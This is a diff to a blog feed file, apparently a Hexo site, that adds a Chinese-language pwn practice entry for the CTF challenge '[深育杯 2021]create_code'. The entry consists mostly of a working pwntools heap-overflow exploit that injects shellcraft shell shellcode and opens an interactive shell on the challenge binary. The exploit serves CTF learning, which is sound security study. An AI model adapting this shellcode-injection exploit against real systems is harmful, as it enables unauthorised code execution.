@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>练习1</title>
+      <link href="/2025/01/30/%E7%BB%83%E4%B9%A01/"/>
+      <url>/2025/01/30/%E7%BB%83%E4%B9%A01/</url>
+      
+        <content type="html"><![CDATA[<p><strong>[深育杯 2021]create_code</strong></p><p>Ubuntu20</p><p>题目链接 : <span class="exturl"><a class="exturl__link"   href="https://www.nssctf.cn/problem/775" >https://www.nssctf.cn/problem/775</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><span id="more"></span><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&quot;node4.anna.nssctf.cn&quot;, 28906)</span></span><br><span class="line">io = process(<span class="string">&quot;./create_code&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">message = <span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;content: &#x27;</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;id: &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">malloc()</span><br><span class="line">payload = <span class="string">b&#x27;\x0c\x00&#x27;</span> * (<span class="number">0xbc</span> // <span class="number">2</span>) + asm(shellcraft.sh())</span><br><span class="line">malloc(payload)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload = p32(<span class="number">4027772946</span>) + <span class="string">b&#x27;\x0c\x00&#x27;</span> * (<span class="number">0x3E4</span> // <span class="number">2</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">malloc(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 0xa6的pwn练习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> 堆 </tag>
+            
+            <tag> 堆溢出 </tag>
+            
+            <tag> shellcode </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>2025启航杯密码和pwn题目题解</title>
       <link href="/2025/01/26/2025%E5%90%AF%E8%88%AA%E6%9D%AF%E5%AF%86%E7%A0%81%E5%92%8Cpwn%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3/"/>
       <url>/2025/01/26/2025%E5%90%AF%E8%88%AA%E6%9D%AF%E5%AF%86%E7%A0%81%E5%92%8Cpwn%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3/</url>
